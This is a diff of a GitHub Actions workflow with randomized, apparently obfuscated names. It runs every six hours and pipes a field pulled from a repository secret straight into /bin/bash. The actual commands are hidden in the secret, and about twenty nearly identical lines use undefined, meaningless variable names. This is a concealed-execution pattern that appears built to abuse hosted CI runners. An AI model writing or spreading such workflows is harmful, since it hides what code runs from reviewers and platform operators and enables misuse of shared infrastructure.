@@ -3,8 +3,7 @@ name: wangyinzi1234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 4/6 * * *'
-
+    - cron: '15 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +11,26 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangyinzi1234
         env:
-          gymn9: ${{ secrets.gymn9 }}
+          mfo34202: ${{ secrets.mfo34202 }}
         run: |
-          echo $gymn9 | jq -r .bxuu945 | /bin/bash
-          echo $hnc4744 | jq -r .qu4 | /bin/bash
-          echo $c85 | jq -r .okkk3 | /bin/bash
-          echo $znb16 | jq -r .b8 | /bin/bash
-          echo $xs9662 | jq -r .cb2 | /bin/bash
-          echo $a27272 | jq -r .l9 | /bin/bash
-          echo $ugvjn8 | jq -r .rnp77 | /bin/bash
-          echo $scltx1 | jq -r .k708 | /bin/bash
-          echo $tdccb86 | jq -r .acy198 | /bin/bash
-          echo $ab3 | jq -r .vu07992 | /bin/bash
-          echo $rqu2461 | jq -r .ql5 | /bin/bash
+          echo $mfo34202 | jq -r .cfae28 | /bin/bash
+          echo $op29 | jq -r .yd3 | /bin/bash
+          echo $h96364 | jq -r .s89 | /bin/bash
+          echo $okzoa36 | jq -r .tdvzm2 | /bin/bash
+          echo $j4 | jq -r .vh9 | /bin/bash
+          echo $ynldy71205 | jq -r .yv17072 | /bin/bash
+          echo $nldwc7 | jq -r .sfs403 | /bin/bash
+          echo $fhcki69032 | jq -r .j10 | /bin/bash
+          echo $f7 | jq -r .emnz2672 | /bin/bash
+          echo $au9 | jq -r .sv21548 | /bin/bash
+          echo $pt261 | jq -r .vms323 | /bin/bash
+          echo $xsi713 | jq -r .ac2855 | /bin/bash
+          echo $vaf95190 | jq -r .kwquh3541 | /bin/bash
+          echo $bi7315 | jq -r .aca68 | /bin/bash
+          echo $wozo4076 | jq -r .aw540 | /bin/bash
+          echo $vzb141 | jq -r .ppp6 | /bin/bash
+          echo $rtvon7886 | jq -r .ayeu66151 | /bin/bash
+          echo $pts7 | jq -r .fkynb4754 | /bin/bash
+          echo $xc3621 | jq -r .blgg703 | /bin/bash
+          echo $sjq23195 | jq -r .ldzb9 | /bin/bash
 
